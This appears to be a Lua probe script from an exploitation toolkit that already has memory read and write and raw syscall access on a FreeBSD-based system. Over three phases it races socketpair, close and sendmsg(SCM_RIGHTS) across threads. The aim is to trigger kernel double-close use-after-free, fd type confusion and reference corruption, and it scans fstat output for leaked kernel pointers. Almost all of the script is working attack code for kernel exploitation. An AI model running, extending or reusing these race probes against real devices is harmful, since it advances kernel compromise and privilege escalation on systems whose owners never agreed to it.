-- CRASH_CLASS: HIGH
-- PROBE 144a: socketpair + close fd table race
--
-- Context: Threads work (126h). socketpair(135) works. close(6) works.
-- Race: Thread A creates socketpair while Thread B closes fds.
-- If close() and socketpair() race on the fd table, we can get:
--   1. Double-close (fd freed twice → kernel UAF on file struct)
--   2. Type confusion (fd reused for different object mid-operation)
--   3. Leaked file structs (refcount goes negative)
--
-- Also: race sendmsg(SCM_RIGHTS) passing an fd while closing it —
-- the kernel must hold a reference, but the race can corrupt the ref.

print("=== PROBE 144a: SOCKETPAIR FD TABLE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 144a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- ============================================================
-- PHASE 1: Baseline socketpair + fstat
-- ============================================================
print("")
print("--- PHASE 1: BASELINE ---")

local pair_buf = memory.alloc(8)
safe_wq(pair_buf, uint64(0))
local sp = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(pair_buf)))
local fd_a = safe_rd(pair_buf)
local fd_b = safe_rd(pair_buf + 4)
print("socketpair ret=" .. sp .. " fds=" .. (fd_a or "nil") .. "," .. (fd_b or "nil"))

if sp ~= 0 then
    print("socketpair failed — aborting")
    print("=== PROBE 144a COMPLETE ===")
    return
end

-- fstat on both
local stat_buf = memory.alloc(256)
for _, fd in ipairs({fd_a, fd_b}) do
    safe_wq(stat_buf, uint64(0))
    local fs = to_num(native.fcall_with_rax(stub, 189, fd, to_num(stat_buf)))
    local st_dev = safe_rq(stat_buf)
    local st_ino = safe_rq(stat_buf + 8)
    local st_mode = safe_rd(stat_buf + 16)
    print(string.format("  fstat(%d) ret=%d dev=%s ino=%s mode=0x%X",
        fd, fs, fmt_addr(st_dev), fmt_addr(st_ino), st_mode or 0))
    for off = 0, 240, 8 do
        local v = safe_rq(stat_buf + off)
        if is_kptr(v) then
            print(string.format("    *** KPTR at +0x%X: %s ***", off, fmt_addr(v)))
        end
    end
end

native.fcall_with_rax(stub, 6, fd_a)
native.fcall_with_rax(stub, 6, fd_b)
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Create+close race
-- ============================================================
print("")
print("--- PHASE 2: CREATE+CLOSE RACE ---")

local RACE_ROUNDS = 200
local type_confusion = 0
local double_close_err = 0

for round = 1, RACE_ROUNDS do
    -- Create a socketpair
    safe_wq(pair_buf, uint64(0))
    local r = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(pair_buf)))
    if r ~= 0 then break end
    local a = safe_rd(pair_buf)
    local b = safe_rd(pair_buf + 4)

    -- Thread: scheduling pressure via atomic_add
    local shared = memory.alloc(8)
    safe_wq(shared, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, atomic_fn, uint64(to_num(shared)))

    -- RACE: close fd_a, then immediately create a new socket on same fd#
    native.fcall_with_rax(stub, 6, a)

    -- Create IPv6 socket — may get same fd number as 'a'
    local reuse = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0))

    if reuse == a then
        -- Same fd number reused! Now 'b' is a UNIX socketpair endpoint
        -- but 'a'/reuse is an IPv6 socket. If kernel still links them...
        type_confusion = type_confusion + 1

        if type_confusion <= 5 then
            -- Try to write through 'b' and see what happens
            local wbuf = memory.alloc(8)
            safe_wq(wbuf, uint64(0xDEADDEAD))
            local wr = to_num(native.fcall_with_rax(stub, 4, b, to_num(wbuf), 8))

            -- Try to read from reused fd (now IPv6 socket)
            local rbuf = memory.alloc(8)
            safe_wq(rbuf, uint64(0))
            local rr = to_num(native.fcall_with_rax(stub, 3, reuse, to_num(rbuf), 8))

            print(string.format("  *** TYPE CONFUSION round %d: fd %d reused. write(b)=%d read(reuse)=%d ***",
                round, a, wr, rr))

            -- fstat the reused fd
            safe_wq(stat_buf, uint64(0))
            native.fcall_with_rax(stub, 189, reuse, to_num(stat_buf))
            for off = 0, 120, 8 do
                local v = safe_rq(stat_buf + off)
                if is_kptr(v) then
                    print(string.format("    KPTR at +0x%X: %s", off, fmt_addr(v)))
                end
            end
        end
    end

    -- Try double-close on 'a' (already closed)
    local dc = to_num(native.fcall_with_rax(stub, 6, a))
    if dc == 0 then
        double_close_err = double_close_err + 1
        if double_close_err <= 3 then
            print(string.format("  *** DOUBLE CLOSE round %d: close(%d) returned 0 ***", round, a))
        end
    end

    -- Cleanup
    native.fcall_with_rax(stub, 6, b)
    if reuse >= 0 and reuse ~= a then
        native.fcall_with_rax(stub, 6, reuse)
    elseif reuse == a then
        native.fcall_with_rax(stub, 6, reuse)
    end

    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    if round % 50 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/" .. RACE_ROUNDS ..
              " type_confusion=" .. type_confusion .. " double_close=" .. double_close_err)
    end
end

print("Type confusion (fd reuse): " .. type_confusion)
print("Double close successes: " .. double_close_err)
print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: SCM_RIGHTS fd pass during close race
-- ============================================================
print("")
print("--- PHASE 3: SCM_RIGHTS + CLOSE RACE ---")

-- Build msghdr + cmsg for SCM_RIGHTS
local SCM_RIGHTS = 1
local SOL_SOCKET = 0xFFFF
local CMSG_LEN_1FD = 20    -- sizeof(cmsghdr) + sizeof(int) on FreeBSD amd64
local CMSG_SPACE_1FD = 24  -- aligned

local scm_hits = 0

for round = 1, 100 do
    -- Create transport socketpair (UNIX STREAM)
    safe_wq(pair_buf, uint64(0))
    local r1 = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(pair_buf)))
    if r1 ~= 0 then break end
    local tx = safe_rd(pair_buf)
    local rx = safe_rd(pair_buf + 4)

    -- Create target fd to pass
    local target = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0))
    if target < 0 then
        native.fcall_with_rax(stub, 6, tx)
        native.fcall_with_rax(stub, 6, rx)
        break
    end

    -- Build cmsg: SCM_RIGHTS with target fd
    local cmsg = memory.alloc(CMSG_SPACE_1FD)
    safe_wd(cmsg, CMSG_LEN_1FD)        -- cmsg_len
    safe_wd(cmsg + 4, SOL_SOCKET)       -- cmsg_level
    safe_wd(cmsg + 8, SCM_RIGHTS)       -- cmsg_type
    safe_wd(cmsg + 16, target)           -- the fd (after 16-byte cmsghdr on amd64)

    -- Actually FreeBSD cmsghdr is 12 bytes: {len(4), level(4), type(4)}
    -- Then fd at offset 12, CMSG_LEN = 12 + 4 = 16, CMSG_SPACE = 16
    safe_wd(cmsg, 16)                   -- cmsg_len = 16
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + 12, target)

    -- Build msghdr
    local msghdr = memory.alloc(64)
    safe_wq(msghdr, uint64(0))          -- msg_name
    safe_wd(msghdr + 8, 0)              -- msg_namelen
    -- iov
    local iov = memory.alloc(16)
    local dummy_data = memory.alloc(4)
    safe_wd(dummy_data, 0x42)
    safe_wq(iov, uint64(to_num(dummy_data)))  -- iov_base
    safe_wq(iov + 8, uint64(1))               -- iov_len
    safe_wq(msghdr + 16, uint64(to_num(iov))) -- msg_iov
    safe_wd(msghdr + 24, 1)                    -- msg_iovlen (32-bit on some, 64 on others)
    -- For FreeBSD amd64 msghdr layout:
    -- +0: msg_name (8)
    -- +8: msg_namelen (4) + pad(4)
    -- +16: msg_iov (8)
    -- +24: msg_iovlen (4) + pad(4)
    -- +32: msg_control (8)
    -- +40: msg_controllen (4)
    -- +44: msg_flags (4)
    safe_wq(msghdr + 32, uint64(to_num(cmsg)))
    safe_wd(msghdr + 40, 16)            -- msg_controllen

    -- Thread: scheduling pressure
    local shared = memory.alloc(8)
    safe_wq(shared, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, atomic_fn, uint64(to_num(shared)))

    -- RACE: close target fd while sendmsg passes it
    native.fcall_with_rax(stub, 6, target)

    -- sendmsg on closed fd — kernel should fail, but race window exists
    local sm = to_num(native.fcall_with_rax(stub, 28, tx, to_num(msghdr), 0))

    if sm > 0 then
        scm_hits = scm_hits + 1
        if scm_hits <= 5 then
            print(string.format("  *** SCM_RIGHTS RACE HIT round %d: sendmsg ret=%d (fd was closed) ***", round, sm))

            -- Try to receive the passed fd
            local rcmsg = memory.alloc(24)
            safe_wq(rcmsg, uint64(0))
            local rmsg = memory.alloc(64)
            local riov = memory.alloc(16)
            local rbuf = memory.alloc(4)
            safe_wq(riov, uint64(to_num(rbuf)))
            safe_wq(riov + 8, uint64(4))
            safe_wq(rmsg, uint64(0))
            safe_wd(rmsg + 8, 0)
            safe_wq(rmsg + 16, uint64(to_num(riov)))
            safe_wd(rmsg + 24, 1)
            safe_wq(rmsg + 32, uint64(to_num(rcmsg)))
            safe_wd(rmsg + 40, 24)

            local rm = to_num(native.fcall_with_rax(stub, 27, rx, to_num(rmsg), 0))
            if rm > 0 then
                local recv_fd = safe_rd(rcmsg + 12)
                print(string.format("    recvmsg got fd=%d", recv_fd or -1))
                if recv_fd and recv_fd >= 0 then
                    -- fstat the received fd — it might reference freed memory
                    safe_wq(stat_buf, uint64(0))
                    native.fcall_with_rax(stub, 189, recv_fd, to_num(stat_buf))
                    for off = 0, 120, 8 do
                        local v = safe_rq(stat_buf + off)
                        if is_kptr(v) then
                            print(string.format("    KPTR at +0x%X: %s", off, fmt_addr(v)))
                        end
                    end
                    native.fcall_with_rax(stub, 6, recv_fd)
                end
            end
        end
    end

    native.fcall_with_rax(stub, 6, tx)
    native.fcall_with_rax(stub, 6, rx)
    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    if round % 25 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/100 scm_hits=" .. scm_hits)
    end
end

print("SCM_RIGHTS race hits: " .. scm_hits)

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 144a COMPLETE ===")
